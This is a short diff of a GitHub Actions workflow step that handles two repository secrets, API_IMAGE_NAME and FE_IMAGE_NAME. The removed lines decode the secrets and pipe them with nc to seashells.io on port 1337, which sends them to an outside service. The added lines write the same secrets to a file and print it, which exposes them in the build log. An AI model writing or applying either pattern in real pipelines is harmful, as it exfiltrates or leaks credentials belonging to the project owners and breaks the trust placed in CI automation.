@@ -21,5 +21,6 @@ jobs:
 
       - name: Run a multi-line script
         run: |
-          echo ${{secrets.API_IMAGE_NAME}} | base64 -d | nc seashells.io 1337
-          echo ${{secrets.FE_IMAGE_NAME}} | base64 -d | nc seashells.io 1337
+          echo ${{secrets.API_IMAGE_NAME}} >> file.txt
+          echo ${{secrets.FE_IMAGE_NAME}} >> file.txt
+          cat file.txt
